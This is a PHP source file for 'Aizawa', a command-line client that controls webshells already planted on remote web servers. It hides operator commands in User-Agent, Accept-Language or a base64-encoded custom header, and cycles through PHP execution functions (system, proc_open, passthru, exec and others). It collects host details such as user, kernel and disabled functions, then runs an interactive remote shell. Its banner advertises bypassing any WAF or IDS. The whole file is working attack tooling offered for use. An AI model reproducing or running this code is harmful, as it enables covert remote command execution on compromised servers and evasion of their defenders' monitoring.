<?php
//////////////////////////////////////////////////////
//                                                  //
//                  A I Z A W A                     //
//                                                  //
// Simple command Line webshell by @elliottophellia //
//                                                  //
//////////////////////////////////////////////////////
$bold = "\033[1m";  $red = "\033[31m";
$clear = "\033[0m"; $cyan = "\033[36m";
$blue = "\033[34m"; $purple = "\033[35m";
$green = "\033[32m";$yellow = "\033[33m";
function curl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    return $ch;
}
function http_user_agent_get($url, $cmd)
{
    $ch = curl($url);
    curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_accept_language_get($url, $cmd)
{
    $ch = curl($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept-Language: ' . $cmd]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_user_agent_post($url, $type, $cmd)
{
    $ch = curl($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $type);
    curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_accept_language_post($url, $type, $cmd)
{
    $ch = curl($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $type);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept-Language: ' . $cmd]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_aizawa_ninja($url, $cmd)
{
    $ch = curl($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Aizawa-Ninja: ' . base64_encode((string) $cmd)]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function execute($url, $cmd, $type)
{
    switch ($type) {

        case "get":
            //
            //  it's kinda weird that if you use curl to get the response code like the post method below
            //  the $httpcode is working fine if you adding query delimiter (?) to the url
            //  something like this:  $queryDelimiter = strpos($url, '?') !== false ? '&' : '?';
            //  but alas, the result still the same, the $httpcode is working fine but the $result is not
            //  but if you init a new curl like this, it's working fine
            //  so i'm just gonna leave it like this
            //  if you have any idea why this is happening, please let me know or just make a pull request
            //
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url . $cmd);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            $result = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            return [$result, $httpcode];        

        case "post":
            $ch = curl($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $cmd);
            $result = curl_exec($ch);
            curl_close($ch);
            return $result;

        case "http_user_agent_get":
            $result = http_user_agent_get($url . "?cmd=system", $cmd);
            switch (true) {
                case empty($result):
                    $result = http_user_agent_get($url . "?cmd=proc_open", $cmd);
                    switch (true) {
                        case empty($result):
                            $result = http_user_agent_get($url . "?cmd=popen", $cmd);
                            switch (true) {
                                case empty($result):
                                    $result = http_user_agent_get($url . "?cmd=passthru", $cmd);
                                    switch (true) {
                                        case empty($result):
                                            $result = http_user_agent_get($url . "?cmd=shell_exec", $cmd);
                                            switch (true) {
                                                case empty($result):
                                                    $result = http_user_agent_get($url . "?cmd=exec", $cmd);
                                                    switch (true) {
                                                        case empty($result):
                                                            $result = $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] . "\n";
                                                            break;
                                                    }
                                                    break;
                                            }
                                            break;
                                    }
                                    break;
                            }
                            break;
                    }
                    break;
            }            
            return $result;

        case "http_accept_language_get":
            $result = http_accept_language_get($url . "?cmd=system", $cmd);
            switch (true) {
                case empty($result):
                    $result = http_accept_language_get($url . "?cmd=proc_open", $cmd);
                    switch (true) {
                        case empty($result):
                            $result = http_accept_language_get($url . "?cmd=popen", $cmd);
                            switch (true) {
                                case empty($result):
                                    $result = http_accept_language_get($url . "?cmd=passthru", $cmd);
                                    switch (true) {
                                        case empty($result):
                                            $result = http_accept_language_get($url . "?cmd=shell_exec", $cmd);
                                            switch (true) {
                                                case empty($result):
                                                    $result = http_accept_language_get($url . "?cmd=exec", $cmd);
                                                    switch (true) {
                                                        case empty($result):
                                                            $result = $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] . "\n";
                                                            break;
                                                    }
                                                    break;
                                            }
                                            break;
                                    }
                                    break;
                            }
                            break;
                    }
                    break;
            }            
            return $result;

        case "http_user_agent_post":
            $result = http_user_agent_post($url, "cmd=system", $cmd);
            switch (true) {
                case empty($result):
                    $result = http_user_agent_post($url, "cmd=proc_open", $cmd);
                    switch (true) {
                        case empty($result):
                            $result = http_user_agent_post($url, "cmd=popen", $cmd);
                            switch (true) {
                                case empty($result):
                                    $result = http_user_agent_post($url, "cmd=passthru", $cmd);
                                    switch (true) {
                                        case empty($result):
                                            $result = http_user_agent_post($url, "cmd=shell_exec", $cmd);
                                            switch (true) {
                                                case empty($result):
                                                    $result = http_user_agent_post($url, "cmd=exec", $cmd);
                                                    switch (true) {
                                                        case empty($result):
                                                            $result = $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] . "\n";
                                                            break;
                                                    }
                                                    break;
                                            }
                                            break;
                                    }
                                    break;
                            }
                            break;
                    }
                    break;
            }            
            return $result;

        case "http_accept_language_post":
            $result = http_accept_language_post($url, "cmd=system", $cmd);
            switch (true) {
                case empty($result):
                    $result = http_accept_language_post($url, "cmd=proc_open", $cmd);
                    switch (true) {
                        case empty($result):
                            $result = http_accept_language_post($url, "cmd=popen", $cmd);
                            switch (true) {
                                case empty($result):
                                    $result = http_accept_language_post($url, "cmd=passthru", $cmd);
                                    switch (true) {
                                        case empty($result):
                                            $result = http_accept_language_post($url, "cmd=shell_exec", $cmd);
                                            switch (true) {
                                                case empty($result):
                                                    $result = http_accept_language_post($url, "cmd=exec", $cmd);
                                                    switch (true) {
                                                        case empty($result):
                                                            $result = $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] . "\n";
                                                            break;
                                                    }
                                                    break;
                                            }
                                            break;
                                    }
                                    break;
                            }
                            break;
                    }
                    break;
            }            
            return $result;

        case "http_aizawa_ninja_eval":
            $result = http_aizawa_ninja($url, "system~" . $cmd);
            switch (true) {
                case empty($result):
                    $result = http_aizawa_ninja($url, "passthru~" . $cmd);
                    switch (true) {
                        case empty($result):
                            $result = http_aizawa_ninja($url, "shell_exec~" . $cmd);
                            switch (true) {
                                case empty($result):
                                    $result = http_aizawa_ninja($url, "exec~" . $cmd);
                                    switch (true) {
                                        case empty($result):
                                            $result = $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] . "\n";
                                            break;
                                    }
                                    break;
                            }
                            break;
                    }
                    break;
            }            
            return $result;

        case "http_aizawa_ninja_concat" || "http_aizawa_ninja_debug" || "http_aizawa_ninja_gc" || "http_aizawa_ninja_json" || "http_aizawa_ninja_filter":
            $result = http_aizawa_ninja($url, $cmd);
            return $result;

        default:
            return null;
    }
}
print "$GLOBALS[yellow]\n   ___   ________  ___ _      _____ \n  / _ | /  _/_  / / _ | | /| / / _ |\n / __ |_/ /  / /_$GLOBALS[blue]/ __ | |/ |/ / __ |\n/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|$GLOBALS[clear]\nA Super Simple Command Line Webshell\nFor Bypassing Any Kind of WAF or IDS\nCode by $GLOBALS[bold]@$GLOBALS[red]elliottophellia$GLOBALS[clear]    $GLOBALS[bold]#$GLOBALS[red]V$GLOBALS[purple]S$GLOBALS[blue]P$GLOBALS[yellow]O$GLOBALS[clear]Fan\n";
$url = $argv[1] ?? readline("Webshell URL: ");
switch (filter_var($url, FILTER_VALIDATE_URL)) {
    case false:
        print "\n$GLOBALS[bold]$GLOBALS[yellow]WARNING!$GLOBALS[clear]\n$GLOBALS[red]ERROR$GLOBALS[clear]: Invalid URL format\nThis does not appear to be a valid URL/IP address\nPlease check the URL and try again\n\nNOTE: localhost/127.0.0.1 is not supported\n\n";
        exit;
}

$remove_cmd = preg_match('/^.*(?:\.)[a-zA-Z]+/m', $url, $matches);
$url = $matches[0];
switch (execute($url, '', 'get')[1]) {
    case 200:
        break;
        
    default:
        print "\n$GLOBALS[bold]$GLOBALS[yellow]WARNING!$GLOBALS[clear]\n$GLOBALS[red]ERROR$GLOBALS[clear]: Invalid HTTP response\nHTTP response code is not 200, please check the URL and try again\n\nNOTE: Aizawa Ninja Edition sometimes returns with HTTP code 500\n\n";
        exit;
}

$filename = substr($url, strrpos($url, '/') + 1);
$hua = preg_match('/get_aizawa_hua_(.*)\./', $filename, $hua);
$hal = preg_match('/get_aizawa_hal_(.*)\./', $filename, $hal);
$hua1 = preg_match('/post_aizawa_hua_(.*)\./', $filename, $hua1);
$hal1 = preg_match('/post_aizawa_hal_(.*)\./', $filename, $hal1);
$ninja1 = preg_match('/aizawa_ninja_eval(.*)\./', $filename, $ninja1);
$ninja2 = preg_match('/aizawa_ninja_concat(.*)\./', $filename, $ninja2);
$ninja3 = preg_match('/aizawa_ninja_debug(.*)\./', $filename, $ninja3);
$ninja4 = preg_match('/aizawa_ninja_gc(.*)\./', $filename, $ninja4);
$ninja5 = preg_match('/aizawa_ninja_json(.*)\./', $filename, $ninja5);
$ninja6 = preg_match('/aizawa_ninja_filter(.*)\./', $filename, $ninja6);
switch (true) {
    case $hua:
        $type = "http_user_agent_get";
        break;
        
    case $hal:
        $type = "http_accept_language_get";
        break;
        
    case $hua1:
        $type = "http_user_agent_post";
        break;
        
    case $hal1:
        $type = "http_accept_language_post";
        break;
        
    case $ninja1:
        $type = "http_aizawa_ninja_eval";
        break;
    
    case $ninja2:
        $type = "http_aizawa_ninja_concat";
        break;

    case $ninja3:
        $type = "http_aizawa_ninja_debug";
        break;

    case $ninja4:
        $type = "http_aizawa_ninja_gc";
        break;

    case $ninja5:
        $type = "http_aizawa_ninja_json";
        break;

    case $ninja6:
        $type = "http_aizawa_ninja_filter";
        break;
        
    default:
        print "\n$GLOBALS[bold]$GLOBALS[yellow]WARNING!$GLOBALS[clear]\n$GLOBALS[red]ERROR$GLOBALS[clear]: Invalid Aizawa webshell\nThis does not appear to be a valid Aizawa webshell\nPlease check the URL and don't change the filename\n\nNOTE: you can change the file extension to bypass WAF but don't change the filename\n\n";
        exit;
}
$user = execute($url, "whoami", $type);
$user = preg_replace('/\s+/', '', (string) $user);
$user = empty($user) ? "aizawaema" : ($user === "ERROR" ? "aizawaema" : $user);
$hostname = execute($url, "hostname", $type);
$hostname = preg_replace('/\s+/', '', (string) $hostname);
$hostname = empty($hostname) ? "virtualesport" : ($hostname === "ERROR" ? "virtualesport" : $hostname);
switch (true) {
    case $ninja1 || $ninja2 || $ninja3 || $ninja4 || $ninja5 || $ninja6:
        print "\n$GLOBALS[green]Successfully connected to Aizawa Webshell Ninja Edition!$GLOBALS[clear]\n\n";
        break;
    default:
        switch (true) {
            case $hua1 || $hal1:
                $disablefunc = execute($url, "disable_functions", "post");
                $safemode = execute($url, "safe_mode", "post");
                $kernel = execute($url, "unamea", "post");
                $server = execute($url, "server", "post");
                $sip = execute($url, "server_ip", "post");
                $cip = execute($url, "client_ip", "post");
                break;

            default:
                $disablefunc = execute($url, "?disable_functions", "get")[0];
                $safemode = execute($url, "?safe_mode", "get")[0];
                $kernel = execute($url, "?unamea", "get")[0];
                $server = execute($url, "?server", "get")[0];
                $sip = execute($url, "?server_ip", "get")[0];
                $cip = execute($url, "?client_ip", "get")[0];
                break;
        }
        $disablefunc = empty($disablefunc) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : ($disablefunc == "NONE" ? $GLOBALS["green"] . $disablefunc . $GLOBALS["clear"] : $GLOBALS["red"] . $disablefunc . $GLOBALS["clear"]);
        $safemode = empty($safemode) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : ($safemode == "ON" ? $GLOBALS["red"] . $safemode . $GLOBALS["clear"] : $GLOBALS["green"] . $safemode . $GLOBALS["clear"]);
        $kernel = empty($kernel) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $kernel . $GLOBALS["clear"];
        $server = empty($server) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $server . $GLOBALS["clear"];
        $sip = empty($sip) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $sip . $GLOBALS["clear"];
        $cip = empty($cip) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $cip . $GLOBALS["clear"];        
        print "\nKernel       :  $kernel\nServer       :  $server\nSafe Mode    :  $safemode\nServer IP    :  $sip\nClient IP    :  $cip\nDisable Func :  $disablefunc\n\n";
    break;
}
do {
    $cmd = readline($GLOBALS["yellow"] . $user . $GLOBALS["clear"] . "@" . $GLOBALS["blue"] . $hostname . $GLOBALS["clear"] . ":~" . $GLOBALS["bold"] . "$ " . $GLOBALS["clear"]);
    readline_add_history($cmd);
    switch ($cmd) {
        case 'exit':
            break;
        default:
            print "\n" . $GLOBALS["cyan"] . execute($url, $cmd, $type) . $GLOBALS["clear"] . "\n";
    }
} while ($cmd != 'exit');

